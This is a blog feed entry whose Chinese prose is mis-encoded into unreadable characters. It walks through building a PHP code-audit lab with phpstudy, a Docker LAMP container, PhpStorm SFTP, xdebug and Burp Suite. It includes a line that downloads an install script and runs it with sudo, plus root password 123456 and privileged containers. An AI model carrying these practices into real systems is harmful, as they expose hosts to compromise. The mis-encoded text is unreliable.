    <content type="html"><![CDATA[<h2 id="0x01-æ­å»ºä»£ç å®¡è®¡çš„ç¯å¢ƒ"><a href="#0x01-æ­å»ºä»£ç å®¡è®¡çš„ç¯å¢ƒ" class="headerlink" title="0x01 æ­å»ºä»£ç å®¡è®¡çš„ç¯å¢ƒ"></a>0x01 æ­å»ºä»£ç å®¡è®¡çš„ç¯å¢ƒ</h2><p>å¸¸ç”¨çš„è°ƒè¯•ç¯å¢ƒ</p><ul><li>windows</li><li>Linux</li><li>docker</li></ul><h3 id="1-windowsç¯å¢ƒä¸‹æ­å»º"><a href="#1-windowsç¯å¢ƒä¸‹æ­å»º" class="headerlink" title="1.windowsç¯å¢ƒä¸‹æ­å»º"></a>1.windowsç¯å¢ƒä¸‹æ­å»º</h3><p>windowsä¸‹ä½¿ç”¨ phpstudy å³å¯æ­å»ºæˆåŠŸï¼Œ<a href="https://www.xp.cn/">å®˜ç½‘</a>åœ°å€ã€å®‰è£…å³å¯ã€‚phpstudyé›†æˆäº†ä¸€æ•´å¥—PHPçš„ç¯å¢ƒï¼Œæ–¹ä¾¿æ—¥åè°ƒè¯•ã€‚</p><p>å…·ä½“è¯¦ç»†ä»‹ç»ï¼Œç™¾åº¦æˆ–è€…Googleå…ˆè¡Œ</p><p>phpstudy ä¸»è¦çš„ç›®å½•ï¼ˆä»¥phpStudy v8.1ï¼Œ2018ç‰ˆï¼Œç›®å½•ä¸ä¸€æ ·ï¼‰</p><blockquote><p>å¸¸ç”¨çš„ç›®å½•æ˜¯ wwwã€Extensionsç›®å½•ä¸‹å„ä¸ªæœåŠ¡çš„é…ç½®æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨phpstudyç›´æ¥æ‰“å¼€æˆ–ä¿®æ”¹</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”œâ”€COM         <span class="comment">//phpstudyå®‰è£…ç›®å½•</span></span><br><span class="line">â”œâ”€Extensions  <span class="comment">//å­˜æ”¾æœåŠ¡å®‰è£…çš„ç›®å½•ï¼Œå¦‚MySQLï¼ŒApacheç­‰ï¼Œ</span></span><br><span class="line">â”œâ”€WWW         <span class="comment">//ç½‘ç«™æ ¹ç›®å½•</span></span><br></pre></td></tr></table></figure><h3 id="2-Linuxç¯å¢ƒä¸‹æ­å»º"><a href="#2-Linuxç¯å¢ƒä¸‹æ­å»º" class="headerlink" title="2.Linuxç¯å¢ƒä¸‹æ­å»º"></a>2.Linuxç¯å¢ƒä¸‹æ­å»º</h3><p>Linuxä¸‹å®‰è£…ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œè¿˜æ˜¯ä½¿ç”¨phpstudyï¼Œä¹Ÿå¯ä½¿ç”¨å®å¡”ç­‰å…¶ä»–åœ¨Linuxä¸‹é›†æˆçš„ç¯å¢ƒï¼Œè¿™é‡Œä½¿ç”¨phpstudyå®˜æ–¹<a href="https://www.xp.cn/linux.html">æ–‡æ¡£</a>å†™çš„å¾ˆè¯¦ç»†ï¼Œé€‰æ‹©è‡ªå·±çš„ç‰ˆæœ¬å³å¯</p><p>ä»¥ Ubuntu æ—  docker ä¸ºä¾‹</p><p>æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å³å¯</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O install.sh https://notdocker.xp.cn/install.sh &amp;&amp; sudo bash install.sh</span><br></pre></td></tr></table></figure><p>ç™»å½•åå°ä¼šå‡ºç°ä¸€ä¸ªæ§åˆ¶é¢æ¿ï¼Œç™»å½•åå°ä¿®æ”¹å„ä¸ªæœåŠ¡ç‰ˆæœ¬å’Œwindowsä¸‹çš„ç±»ä¼¼</p><p><img src="/2021/127456454/image-20211204150648217.png" alt="image-20211204150648217"> </p><p>ç›®å½•è¯´æ˜ï¼ˆéœ€è¦rootæƒé™ï¼‰</p><p>å°†ä¸€äº› cms æ”¾åœ¨wwwroot ä¸‹è°ƒè¯•å³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/www/admin/localhost_80/wwwroot   <span class="comment">#ç½‘ç«™ç›®å½•</span></span><br><span class="line">/www/localhost_80/<span class="built_in">error</span>/          <span class="comment">#é”™è¯¯æç¤ºé¡µé¢</span></span><br></pre></td></tr></table></figure><h3 id="3-dockerç¯å¢ƒä¸‹æ­å»º"><a href="#3-dockerç¯å¢ƒä¸‹æ­å»º" class="headerlink" title="3.dockerç¯å¢ƒä¸‹æ­å»º"></a>3.dockerç¯å¢ƒä¸‹æ­å»º</h3><p>dockerå¯ä»¥åšå¾ˆå¤šäº‹æƒ…ï¼Œæ¼æ´ç¯å¢ƒæ­å»ºï¼ŒCTFé¢˜ç›®æµ‹è¯•ç­‰ç­‰ï¼Œè‡ªå·±æ­å»ºå®Œæˆçš„ç¯å¢ƒè¿˜å¯ä»¥ä¾›åˆ«äººä½¿ç”¨ã€‚</p><p>dockeræ”¯æŒå¤šå¹³å°ï¼Œç›®å‰æ¥è¯´åœ¨Linuxä¸‹å®‰è£…æ¯”è¾ƒå¥½ä¸€ç‚¹ï¼Œå¦‚æœæ˜¯åœ¨windowså®‰è£…ï¼Œéœ€è¦å¼€å¯è™šæ‹ŸåŒ–ï¼Œæ‰€ä»¥å»ºè®®è¿˜æ˜¯åœ¨Linuxå®‰è£…ï¼Œ<a href="https://docs.docker.com/engine/install/">docker</a>å®‰è£…ï¼Œæˆ‘å°±ä¸å¤šè¯´äº†ï¼Œå¯ä»¥çœ‹å®˜ç½‘çš„æ–‡æ¡£ï¼Œæˆ–è€…ç™¾åº¦ã€Googleå…ˆè¡Œã€‚</p><h4 id="3-1-docker-ä¸‹æ­å»º-PHP-è¿è¡Œç¯å¢ƒ"><a href="#3-1-docker-ä¸‹æ­å»º-PHP-è¿è¡Œç¯å¢ƒ" class="headerlink" title="3.1 docker ä¸‹æ­å»º PHP è¿è¡Œç¯å¢ƒ"></a>3.1 docker ä¸‹æ­å»º PHP è¿è¡Œç¯å¢ƒ</h4><p>å°† <a href="https://hub.docker.com/_/centos?tab=tags&page=1">centos7</a> ä¸‹è½½åˆ° docker å®¹å™¨ä¸­</p><blockquote><p>æ³¨ï¼šå¦‚æœæ­å»ºdockerç¯å¢ƒéœ€è¦å°†phpstudyç¯å¢ƒè¿›è¡Œå…³é—­ä¿å­˜ï¼Œç„¶åæ¢å¤å¿«ç…§è¿›è¡Œé‡æ–°å®‰è£…ã€‚</p></blockquote><p>è¿™é‡Œå¯ä»¥æŒ‡å®šç‰ˆæœ¬ä¸‹è½½ï¼Œå¦‚æœä½¿ç”¨é»˜è®¤å‘½ä»¤å°†ä¸‹è½½æœ€æ–°ç‰ˆçš„ï¼Œæˆ‘ä»¬æŒ‡å®šcentos7ä¸‹è½½</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull centos:centos7.6.1810</span><br></pre></td></tr></table></figure><p><img src="/2021/127456454/image-20211204170918192.png" alt="image-20211204170918192"> </p><p>ï¼ˆ1ï¼‰å¯åŠ¨ centos 7 å®¹å™¨</p><p>æŸ¥çœ‹å®¹å™¨IDï¼ˆIMAGE ID ä¸ºå®¹å™¨IDï¼‰</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker images</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰è¿è¡Œdocker</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -itd -p 9999:80 --privileged=<span class="literal">true</span> f1cb7c7d58b7 /sbin/init  <span class="comment"># f1cb7c7d58b7 æ˜¯ä½ çš„ IMAGE ID</span></span><br><span class="line">sudo docker ps </span><br><span class="line">sudo docker <span class="built_in">exec</span> -it cdcbed33a88c /bin/bash   <span class="comment"># cdcbed33a88c æ˜¯ä½ åˆšæ‰è¿è¡Œåç”Ÿæˆçš„CONTAINER ID</span></span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰æŒ‚èµ·ä¸è¿è¡Œdocker</p><blockquote><p>ä¾æ¬¡æ‰§è¡Œ Ctrl + P å’Œ Ctrl + Q å¿«æ·é”®é€€å‡ºå®¹å™¨å¹¶ä¿æŒè¿è¡Œ</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ•´å¥—æµç¨‹</span></span><br><span class="line">Ctrl + P å’Œ Ctrl + Q   <span class="comment">#ä¿æŒè¿è¡Œï¼Œé€€å‡ºåå°</span></span><br><span class="line">sudo docker ps              <span class="comment">#æŸ¥çœ‹CONTAINER ID</span></span><br><span class="line"><span class="comment"># å†æ¬¡è¿è¡Œå®¹å™¨</span></span><br><span class="line">sudo docker start -ai cdcbed33a88c   <span class="comment">#å…¶ä¸­cdcbed33a88cä¸ºCONTAINER IDï¼Œè¦è¾“å…¥ä½ è‡ªå·±çš„ID</span></span><br></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰å®‰è£… LAMP ç¯å¢ƒ</p><p>å®‰è£…ç¯å¢ƒï¼Œæˆ‘å°±ç›´æ¥è´´å‘½ä»¤äº†ï¼Œæƒ³è¦çŸ¥é“å‘½ä»¤çš„å«ä¹‰ï¼Œç™¾åº¦æˆ–Googleå…ˆè¡Œ</p><p>å®‰è£… Apache</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install httpd -y</span><br><span class="line">systemctl start httpd</span><br><span class="line">systemctl <span class="built_in">enable</span> httpd</span><br></pre></td></tr></table></figure><p>å®‰è£… MySQL</p><blockquote><p>æ•°æ®åº“ è´¦å·root  å¯†ç  123456</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum install mariadb mariadb-server -y</span><br><span class="line">systemctl start mariadb</span><br><span class="line">systemctl <span class="built_in">enable</span> mariadb</span><br><span class="line">mysqladmin -u root password <span class="string">&quot;123456&quot;</span></span><br><span class="line">mysql -u root -p123456</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>å®‰è£… PHP</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum install -y \</span><br><span class="line">https://repo.ius.io/ius-release-el7.rpm \</span><br><span class="line">https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm</span><br><span class="line">rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</span><br><span class="line">yum -y install php70w-devel php70w.x86_64 php70w-cli.x86_64 php70w-common.x86_64 php70w-gd.x86_64 php70w-ldap.x86_64 php70w-mbstring.x86_64 php70w-mcrypt.x86_64  php70w-pdo.x86_64   php70w-mysqlnd  php70w-fpm php70w-opcache php70w-pecl-redis php70w-pecl-mongodb</span><br><span class="line">php -v</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ç½‘é¡µ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi /<span class="keyword">var</span>/www/html/test.php </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">systemctl restart httpd</span></span><br></pre></td></tr></table></figure><p>è®¿é—®ç½‘é¡µ http:127.0.0.1:9999/test.php</p><h4 id="3-2-docker-ä¸­å®‰è£…CMS"><a href="#3-2-docker-ä¸­å®‰è£…CMS" class="headerlink" title="3.2 docker ä¸­å®‰è£…CMS"></a>3.2 docker ä¸­å®‰è£…CMS</h4><p>ç›´æ¥å°†cmsæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œç„¶åè§£å‹åˆ°æœ¬åœ°ï¼Œä½¿ç”¨docker cp å‘½ä»¤å¤åˆ¶è¿›å»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker cp /home/cms cdcbed33a88c:/<span class="keyword">var</span>/www/html</span><br><span class="line">sudo docker cp æœ¬åœ°cmsæ–‡ä»¶è·¯å¾„ å®¹å™¨åï¼šå®¹å™¨è§£æè·¯å¾„</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœæ–‡ä»¶ä¸å¯å†™å…¥ï¼Œå¯åœ¨å®¹å™¨é‡Œæ‰§è¡Œå‘½ä»¤ <code>chmod -R  755 /var/www/html</code> </p></blockquote><h4 id="3-3-ä¸Šä¼ é•œåƒè‡³-Docker-Hub"><a href="#3-3-ä¸Šä¼ é•œåƒè‡³-Docker-Hub" class="headerlink" title="3.3 ä¸Šä¼ é•œåƒè‡³ Docker Hub"></a>3.3 ä¸Šä¼ é•œåƒè‡³ Docker Hub</h4><p>ä½¿ç”¨ docker ps æŸ¥çœ‹ CONTAINER ID</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker commit cdcbed33a88c lamp_test  <span class="comment"># commit åˆ›å»ºå¹¶ä¿å­˜ä¸å…¶é…å¥—çš„çŸ¥è¯†åº“ï¼ˆlamp_testï¼‰</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨docker images</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker images</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å·²ç»åˆ›å»ºæˆåŠŸäº†</p><p>æ³¨å†Œå¹¶ç™»é™†<a href="https://hub.docker.com/">dockerhub</a>ï¼Œä¾æ¬¡é€‰æ‹©</p><p>Repositories-ã€‹Create Repository</p><p><img src="/2021/127456454/image-20211204193827489.png" alt="image-20211204193827489"> </p><p>ç„¶åè¿”å›Linuxç»ˆç«¯ç™»å½•docker hub</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker login</span><br></pre></td></tr></table></figure><p>è¾“å…¥ç”¨æˆ·åå’Œå¯†ç å³å¯</p><p>çœ‹åˆ°<code>Login Succeeded</code> å°±ç™»å½•æˆåŠŸäº†</p><p>æ‰§è¡Œä¸Šä¼ å‘½ä»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker push lamp_test:latest</span><br></pre></td></tr></table></figure><p>å¦‚æœå‡ºç° <code>denied: requested access to the resource is denied</code>é”™è¯¯ï¼Œè§£å†³æ–¹æ¡ˆå¦‚ä¸‹ï¼Œæ²¡æœ‰åˆ™è·³è¿‡</p><p>1ï¼‰æ›´æ–°ç”¨æˆ·ä»“åº“ä¿¡æ¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker tag lamp_test fz1lin/lamp_test:v1</span><br></pre></td></tr></table></figure><p>2ï¼‰é‡å¯docker</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure><p>é‡æ–°æ‰§è¡Œå‘½ä»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker push fz1lin/lamp_test:v1</span><br></pre></td></tr></table></figure><p>å‡ºç° <code>v1: digest:</code> è¡¨ç¤ºä¸Šä¼ æˆåŠŸäº†</p><p>ç™»å½• docker hub æŸ¥çœ‹</p><p><img src="/2021/127456454/image-20211204195924512.png" alt="image-20211204195924512"> </p><p>ä» docker hub ä¸Šä¸‹è½½</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull fz1lin/lamp_test:v1</span><br></pre></td></tr></table></figure><h3 id="4-PHPstorm-è¿æ¥-docker"><a href="#4-PHPstorm-è¿æ¥-docker" class="headerlink" title="4.PHPstorm è¿æ¥ docker"></a>4.PHPstorm è¿æ¥ docker</h3><p>åœ¨dockerå¯ä»¥ä½¿ç”¨viç¼–å†™ä»£ç ï¼Œä½†è°ƒè¯•ä¸æ˜¯å¾ˆæ–¹ä¾¿ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨çš„æ€è·¯ä¸æ˜¯dockerç›´æ¥è¿æ¥å®¹å™¨ï¼Œè€Œæ˜¯æˆ‘ä»¬ä¹‹å‰ç”¨dockeræ­å»ºè¿‡lampæœåŠ¡ï¼Œæˆ‘ä»¬ä½¿ç”¨SFTPè¿æ¥å®¹å™¨ï¼Œå°†ä»£ç å®æ—¶æ›´æ–°åˆ°å®¹å™¨å†…éƒ¨ï¼Œè¿›è¡Œè°ƒè¯•ï¼Œè¿™é‡Œåœ¨åˆ¶ä½œdockerçš„æ—¶å€™ï¼Œä¹Ÿå¯ä»¥æŠŠsshå®‰è£…è¿›å»ï¼Œè¿›è¡Œæ‰“åŒ…ï¼Œä¹Ÿæ˜¯ä¸€æ ·çš„</p><h4 id="4-1-é…ç½®docker-SSH-æœåŠ¡"><a href="#4-1-é…ç½®docker-SSH-æœåŠ¡" class="headerlink" title="4.1 é…ç½®docker SSH æœåŠ¡"></a>4.1 é…ç½®docker SSH æœåŠ¡</h4><p>æ–°å»ºä¸€ä¸ª docker</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -itd -p 8080:80 -p 2222:22  --privileged=<span class="literal">true</span> 516d7c20fa31 /sbin/init</span><br><span class="line">sudo docker ps </span><br><span class="line">sudo docker <span class="built_in">exec</span> -it cad875338105 /bin/bash</span><br></pre></td></tr></table></figure><p>å®‰è£… openssh å¹¶å¯åŠ¨</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install -y openssh-server</span><br><span class="line">systemctl start sshd</span><br></pre></td></tr></table></figure><p>è®¾ç½® root å¯†ç </p><blockquote><p>123456</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure><p>æµ‹è¯•è¿æ¥</p><p>æ–°å»ºä¸€ä¸ªç»ˆç«¯ Ctrl + Alt + T</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.52.145 -p 2222  </span><br></pre></td></tr></table></figure><h4 id="4-2-ä½¿ç”¨phpstorm-è¿æ¥docker"><a href="#4-2-ä½¿ç”¨phpstorm-è¿æ¥docker" class="headerlink" title="4.2 ä½¿ç”¨phpstorm è¿æ¥docker"></a>4.2 ä½¿ç”¨phpstorm è¿æ¥docker</h4><p>è¿™é‡Œä½¿ç”¨phpstorm æ˜¯æ±‰åŒ–çš„ï¼Œå¦‚æœæ²¡æœ‰æ±‰åŒ–çš„ï¼Œå¯ä»¥è‡ªè¡Œç™¾åº¦ï¼Œæˆ–è€…å»æ’ä»¶åº“ï¼Œä¸‹è½½æ±‰åŒ–æ’ä»¶</p><p>æ‰“å¼€ phpstorm é€‰æ‹© -&gt;Create New Project from Existing Files </p><p><img src="/2021/127456454/image-20211205142240167.png" alt="image-20211205142240167"> </p><p>é€‰æ‹©ä½¿ç”¨SFTPæ¨¡å¼ä¼ è¾“ä»£ç ï¼Œ</p><p><img src="/2021/127456454/image-20211205143505009.png" alt="image-20211205143505009"> </p><p>è®¾ç½®é¡¹ç›®åç§°</p><p><img src="/2021/127456454/image-20211205143603261.png" alt="image-20211205143603261"> </p><p>è®¾ç½®ç”¨æˆ·åå’Œå¯†ç </p><p><img src="/2021/127456454/image-20211205143757363.png" alt="image-20211205143757363"> </p><p>é€‰æ‹©è´¦å·å’Œå¯†ç ï¼Œé€‰æ‹©ç›®å½•ï¼Œä¸æ˜¯ç”¨httpç™»å½•</p><p><img src="/2021/127456454/image-20211205150824355.png" alt="image-20211205150824355">  </p><p>é»˜è®¤å³å¯</p><p><img src="/2021/127456454/image-20211205144138163.png" alt="image-20211205144138163"> </p><p>è®¾ç½®æ–‡ä»¶å®æ—¶æ›´æ–°åˆ°å®¹å™¨å†…</p><p>æ‰“å¼€ æ–‡ä»¶-ã€‹è®¾ç½®-&gt;æ„å»ºï¼Œæ‰§è¡Œï¼Œéƒ¨ç½²-ã€‹Deployment-ã€‹options-ã€‹ä¿®æ”¹ä¸ºAlways</p><p><img src="/2021/127456454/image-20211205144915633.png" alt="image-20211205144915633"> </p><p>æ–°å»ºä¸€ä¸ªæ–‡ä»¶è¾“å…¥æµ‹è¯•ä»£ç ï¼ŒæˆåŠŸè¿æ¥</p><p><img src="/2021/127456454/image-20211205151707728.png" alt="image-20211205151707728"> </p><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>åœ¨ä¸‰ç§ç¯å¢ƒä¸‹æ­å»ºäº† lamp ç¯å¢ƒï¼Œç”¨äºä»¥åï¼Œåœ¨ä¸åŒåœºæ™¯ä¸‹è°ƒè¯•ä»£ç ã€‚ä½¿ç”¨dockeræ­å»ºåŸºç¡€ç¯å¢ƒï¼Œä¹Ÿæ–¹ä¾¿è¿ç§»ï¼Œä¹Ÿæ–¹ä¾¿ï¼Œå¦‚æœå‡ºç°é—®é¢˜ï¼Œæ‰“åŒ…ç»™å¤§ç¥ï¼Œçœ‹è‡ªå·±é—®é¢˜å‡ºåœ¨å“ªé‡Œäº†ï¼Œåˆ‡å¿Œï¼Œåœ¨ä¸Šä¼ çš„æºç çš„æ—¶å€™ï¼Œå…ˆåˆ¤æ–­ï¼Œæ˜¯å¦å¯ä»¥ä¸Šä¼ ã€‚</p><h2 id="0x02-ä»£ç å®¡è®¡çš„å·¥å…·ä»‹ç»"><a href="#0x02-ä»£ç å®¡è®¡çš„å·¥å…·ä»‹ç»" class="headerlink" title="0x02 ä»£ç å®¡è®¡çš„å·¥å…·ä»‹ç»"></a>0x02 ä»£ç å®¡è®¡çš„å·¥å…·ä»‹ç»</h2><p>è°ƒè¯•ä»£ç ä½¿ç”¨åˆ°ä¸‰ä¸ªå·¥å…·</p><ul><li>burpsuite</li><li>phpstormï¼ˆxdebugï¼‰</li><li>Firefox ï¼ˆhackbarå’ŒProxy SwitchyOmegaï¼‰</li></ul><h3 id="1-ä»£ç è°ƒè¯•å·¥å…·-phpstorm-xdebug"><a href="#1-ä»£ç è°ƒè¯•å·¥å…·-phpstorm-xdebug" class="headerlink" title="1.ä»£ç è°ƒè¯•å·¥å…· phpstorm+xdebug"></a>1.ä»£ç è°ƒè¯•å·¥å…· phpstorm+xdebug</h3><p>xdebug æ˜¯ä¸€ä¸ªå¼€æºçš„PHPç¨‹åºè°ƒè¯•å™¨ï¼Œå¯ä»¥ç”¨æ¥è·Ÿè¸ªï¼Œè°ƒè¯•å’Œåˆ†æPHPç¨‹åºçš„è¿è¡ŒçŠ¶å†µ</p><p>xdebug åœ¨ä»»ä½•ç¯å¢ƒä¸‹è°ƒè¯•éƒ½æ˜¯ä¸€æ ·ï¼Œå­˜åœ¨ä¸€ä¸ªå®‰è£…å’Œä¸å®‰è£…ï¼Œ<a href="https://xdebug.org/docs/install">å®˜ç½‘</a>åœ°å€ï¼Œwindowsä¸‹å¯ä»¥ä½¿ç”¨ phpstudyè‡ªå¸¦çš„xdebugæ‰©å±•ï¼Œæ— éœ€å®‰è£…ï¼Œé…ç½®å’Œå†Linuxç¯å¢ƒä¸‹æ˜¯ä¸€æ ·çš„ã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨ç¯å¢ƒ phpstudy + phpstorm + xdebug</p><p>å¼€å¯xdebugæ‰©å±•ï¼ˆå¦‚æœæ˜¯Linuxéœ€è¦è‡ªè¡Œå®‰è£…ï¼‰</p><p><img src="/2021/127456454/image-20211205155614378.png" alt="image-20211205155614378"> </p><p>æ‰“å¼€php.iniï¼Œæœç´¢xdebug</p><p>æ·»åŠ  idekey</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xdebug.idekey= PHPSTORM</span><br></pre></td></tr></table></figure><p><img src="/2021/127456454/image-20211205160636799.png" alt="image-20211205160636799"> </p><p>é‡å¯phpstudyï¼ŒæŸ¥çœ‹phpinfoï¼Œå‡ºç°å¦‚ä¸‹ï¼Œè¡¨ç¤ºæˆåŠŸ</p><p><img src="/2021/127456454/image-20211205160602490.png" alt="image-20211205160602490"> </p><p>æ‰“å¼€phpstorm è¿›å…¥è®¾ç½®é€‰é¡¹-æ‰¾åˆ°å¯¹åº”çš„ç‰ˆæœ¬ï¼Œå¦‚æœæ²¡æœ‰æ·»åŠ å³å¯</p><p><img src="/2021/127456454/image-20211205161055805.png" alt="image-20211205161055805"> </p><p>è®¾ç½®xdebugç«¯å£</p><p><img src="/2021/127456454/image-20211205161235410.png" alt="image-20211205161235410">  </p><p>è®¾ç½® IDE key å’Œhost ä»¥åŠport-ä¿å­˜å¹¶é€€å‡º</p><p><img src="/2021/127456454/image-20211205161344021.png" alt="image-20211205161344021"> </p><p>é€‰æ‹©å¯¹åº”</p><p><img src="/2021/127456454/image-20211205161542656.png" alt="image-20211205161542656"> </p><p>è¾“å…¥ä½ è¦è°ƒè¯•ç½‘ç«™çš„è·¯å¾„ï¼Œä»wwwä¸‹å¼€å§‹è¾“å…¥</p><p><img src="/2021/127456454/image-20211205164221262.png" alt="image-20211205164221262">   </p><p>1.è¿™ä¸ªæ ·å¼è¡¨ç¤ºå¼€å¯è°ƒè¯•</p><p>2.é€‰æ‹©éœ€è¦çš„æ–­ç‚¹çš„åœ°æ–¹</p><p>3.é€‰æ‹©è°ƒè¯•</p><p>ä¼šè·³å‡ºæµè§ˆå™¨ï¼Œç½‘å€å¦‚ä¸‹</p><p><img src="/2021/127456454/image-20211205164624539.png" alt="image-20211205164624539"> </p><p>æ­¤æ—¶å°±å·²ç»è°ƒè¯•å®Œæˆäº†</p><h3 id="2-Firefoxå®‰è£…Proxy-SwitchyOmegaå’Œhackbar"><a href="#2-Firefoxå®‰è£…Proxy-SwitchyOmegaå’Œhackbar" class="headerlink" title="2.Firefoxå®‰è£…Proxy SwitchyOmegaå’Œhackbar"></a>2.Firefoxå®‰è£…Proxy SwitchyOmegaå’Œhackbar</h3><p>ç›´æ¥å®‰è£…å³å¯<a href="https://www.mozilla.org/zh-CN/firefox/new/">Firefox</a></p><p>å®‰è£…<a href="https://addons.mozilla.org/zh-CN/firefox/search/">hackbar</a> åœ¨Firefoxå•†åº—æœç´¢hackbarï¼Œå®‰è£…å³å¯</p><p>è¿™é‡Œè¿˜è¦ä½¿ç”¨ä¸€ä¸ªä»£ç†ï¼Œå°±æ˜¯ Proxy SwitchyOmegaï¼Œä¹Ÿå¯ä»¥åœ¨å•†åº—é‡Œæœç´¢ï¼Œå®‰è£…å³å¯</p><h3 id="3-burpsuite"><a href="#3-burpsuite" class="headerlink" title="3.burpsuite"></a>3.burpsuite</h3><p>æŠ“åŒ…å·¥å…·</p><p>ç›´æ¥<a href="https://portswigger.net/burp/releases">å®˜ç½‘</a>ä¸‹è½½</p><p>ä¸“ä¸šç‰ˆçš„è¯ï¼Œå“ªé‡Œè·å–ï¼Œæ‡‚å¾—éƒ½æ‡‚ï¼Œä¸æ‡‚çš„ä¹Ÿåˆ«é—®æˆ‘è¦ï¼Œç¤¾åŒºç‰ˆçš„å…ˆç”¨ç€</p><h2 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h2><p>ä»£ç å®¡è®¡è®²ç©¶çš„æ˜¯æ€è·¯ï¼Œç»éªŒï¼Œæ­å»ºç¯å¢ƒå‘¢ï¼Œå…¶å®éƒ½å·®ä¸å¤šï¼Œè¿™çœ‹æ¯ä¸ªäººçš„æ€è·¯ã€‚</p>]]></content>
    
    
    <summary type="html">å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨ã€‚</summary>
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://fz1lin.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="PHP" scheme="https://fz1lin.com/tags/PHP/"/>
    
    <category term="æ­å»ºç¯å¢ƒ" scheme="https://fz1lin.com/tags/%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83/"/>
    
  </entry>
  
</feed>
